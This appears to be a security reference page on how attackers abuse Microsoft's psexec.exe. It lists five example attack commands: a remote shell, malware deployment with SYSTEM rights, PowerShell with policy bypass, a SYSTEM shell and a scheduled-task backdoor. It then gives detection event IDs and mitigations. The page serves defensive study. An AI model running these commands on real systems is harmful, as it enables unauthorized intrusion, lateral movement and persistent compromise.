# psexec.exe
## What is it?
*```psexec.exe``` is a command-line tool from Microsoft's **Sysinternals Suite** that allows remote command execution on Windows systems. It enables administrators to run processes on remote machines without needing to log in physically or interact with the desktop environment.*

*Due to its legitimate use for remote system management, attackers frequently abuse ```psexec.exe``` for **lateral movement**, **remote code execution**, and **privilege escalation** while evading detection.*

## Legitimate Usage
- **Remote System Administration** → Execute commands on remote machines without interactive login.
- **Software Deployment** → Install applications and updates across multiple systems.
- **Troubleshooting & Diagnostics** → Run commands on remote systems for analysis and issue resolution.
- **Automated Task Execution** → Execute scheduled tasks across networked systems.

## How to abuse it
- **Lateral Movement** → Attackers use ```psexec.exe``` to execute commands or deploy malware on other machines in the network.
- **Privilege Escalation** → If executed with SYSTEM privileges, ```psexec.exe``` allows attackers to run commands with **elevated permissions**.
- **Remote Code Execution** → Attackers can run scripts, drop payloads, or manipulate system configurations remotely.
- **Credential Theft** → ```psexec.exe``` often requires valid credentials, which attackers can leverage for further network access.
- **EDR & AV Evasion** → Since ```psexec.exe``` is a **trusted Microsoft tool**, some security solutions overlook its execution.

## Example attacks
### 1. Lateral Movement via Remote Command Execution
*Attackers can execute commands on remote machines using valid credentials.*

**Execute a Command on a Remote System**

```
psexec \192.168.1.50 -u admin -p Password123 cmd.exe
```

**Effect:**
- **Opens a remote command shell** on **192.168.1.50** using **admin credentials**.
- **Runs commands interactively** as if the attacker were physically present.

### 2. Deploying Malware via Remote Execution
*Attackers can push and execute malware on remote systems.*

**Copy and Execute a Malicious Payload**

```
psexec \victimPC -u admin -p P@ssw0rd -s -d -i 1 C:\Temp\malware.exe
```

**Effect:**
- **Uploads malware.exe** to the target machine.
- **Runs it with SYSTEM privileges** silently in the background.

### 3. Remote PowerShell Execution via psexec
*Attackers can leverage PowerShell for stealthier remote execution.*

**Execute PowerShell on a Target System**

```
psexec \192.168.1.50 -u admin -p SecretPass -s powershell -exec bypass -File C:\attack.ps1
```

**Effect:**
- **Runs a PowerShell script** on the target with SYSTEM privileges.
- **Bypasses script execution policies** for stealth.

### 4. Gaining SYSTEM Privileges via psexec
*Attackers can execute commands as SYSTEM, gaining full control over the system.*

**Launch SYSTEM Shell**

```
psexec -s -i cmd.exe
```

**Effect:**
- **Opens a SYSTEM-level command prompt**, allowing unrestricted control over the machine.

### 5. Persistent Backdoor via psexec
*Attackers can set up a scheduled task to maintain remote access.*

**Create a Scheduled Task for Persistence**

```
psexec \targetPC -u admin -p adminpass schtasks /create /tn "Backdoor" /tr "C:\Temp\malware.exe" /sc onstart /ru SYSTEM
```

**Effect:**
- **Ensures malware execution** every time the system starts.

# Detection & Mitigation
## Detection Methods
**Monitor for Suspicious psexec Execution**
- **Event ID 4688 (Process Creation)** → Look for psexec-related processes like ```psexesvc.exe```.
- **Event ID 5145 (SMB File Access)** → Detect psexec's use of SMB to push files.

**Look for Remote Command Execution**
- **Event ID 4624 (Logon Success)** → Detect unexpected remote logins using administrator credentials.
- **Event ID 7045 (Service Creation)** → psexec creates a temporary service (```PSEXESVC```), which can indicate abuse.

**Detect Lateral Movement**
- **Unusual Process Execution Across Multiple Systems** → Attackers using psexec often target several hosts in a short time.

## Mitigation Strategies
- **Restrict psexec Execution** → Block execution for non-admin users via Group Policy or AppLocker.
- **Monitor SMB & Admin Shares** → psexec relies on SMB for remote execution; restrict access where possible.
- **Enable Windows Firewall Rules** → Block inbound connections to **Admin$** and **C$** shares from untrusted sources.
- **Use PowerShell Remoting Instead** → Replace psexec with more secure remote management alternatives like **WinRM**.
